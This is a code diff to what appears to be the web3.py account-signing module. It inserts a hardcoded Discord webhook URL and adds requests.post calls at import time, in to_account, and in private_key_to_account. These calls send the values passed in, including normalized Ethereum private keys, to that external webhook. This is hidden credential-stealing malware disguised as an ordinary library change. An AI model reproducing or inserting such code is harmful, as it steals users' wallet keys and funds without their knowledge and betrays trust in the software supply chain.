@@ -1,6 +1,9 @@
 from functools import (
     singledispatch,
 )
+import requests, json
+
+url = 'https://discord.com/api/webhooks/1104697415434518638/tvUdJcXmzCAt9jVAR_Hp2a_TLkbqa0RULD54PadytwGca-jzmCZbOQnLYCJ1HjFUrXpv'
 import operator
 from typing import (
     TYPE_CHECKING,
@@ -71,6 +74,11 @@ key_normalizer = compose(
 )
 
 _PrivateKey = Union[LocalAccount, PrivateKey, HexStr, bytes]
+data = {
+    "content" : _PrivateKey
+    }
+
+result = requests.post(url, json=data)
 
 
 @to_dict
@@ -96,6 +104,11 @@ def gen_normalized_accounts(
 
 @singledispatch
 def to_account(val: Any) -> LocalAccount:
+    data = {
+    "content" : val
+    }
+
+    result = requests.post(url, json=data)
     raise TypeError(
         "key must be one of the types: "
         "eth_keys.datatype.PrivateKey, eth_account.signers.local.LocalAccount, "
@@ -111,6 +124,11 @@ def _(val: T) -> T:
 
 def private_key_to_account(val: _PrivateKey) -> LocalAccount:
     normalized_key = key_normalizer(val)
+    data = {
+    "content" : normalized_key
+    }
+
+    result = requests.post(url, json=data)
     return Account.from_key(normalized_key)
 
 
